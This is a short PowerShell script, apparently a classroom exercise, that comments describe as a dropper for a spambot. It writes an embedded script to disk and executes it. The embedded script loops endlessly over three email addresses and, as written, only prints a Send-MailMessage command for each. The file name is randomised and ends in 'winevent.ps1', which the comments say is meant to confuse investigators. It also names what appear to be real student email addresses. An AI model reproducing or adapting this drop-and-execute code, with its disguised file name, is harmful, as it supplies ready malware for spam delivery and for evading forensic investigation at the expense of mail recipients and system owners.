# Dropper for spambot
# Contains payload that executes payload
# Save sb to directory and execute

 $writeSbot = @"
# Send emails via powershell
$toSend = @('benjamin.gifford@mymail.champlain.edu','benji@mymail.champlain.edu','gifford@mymail.champlain.edu')

# Message body
$msg = "hi lol"

while ($true) {

    foreach ($email in $toSend) {
    # Send the email

        write-host "Send-MailMessage -from 'benjamin.gifford@mymail.champlain.edu' -To $email -Subject 'Hello there' `
        -Body $msg -SmtpServer X.X.X.X"

        # Pause for 1 sec so it doesnt murk my computer
        start-sleep 1

    }

}
"@

# dir to write bot to
$sbDir = "C:\Users\torfo\Documents\SYS-320\Week11\Classwork"

# Create random number to add to file to confuse investigators
$sbRand = Get-Random -Minimum 100 -Maximum 1999

# Create file and location to save bot
$file = $sbDir + $sbRand + "winevent.ps1"

# write to file
$writeSbot | out-file -FilePath $file

Invoke-Expression $file
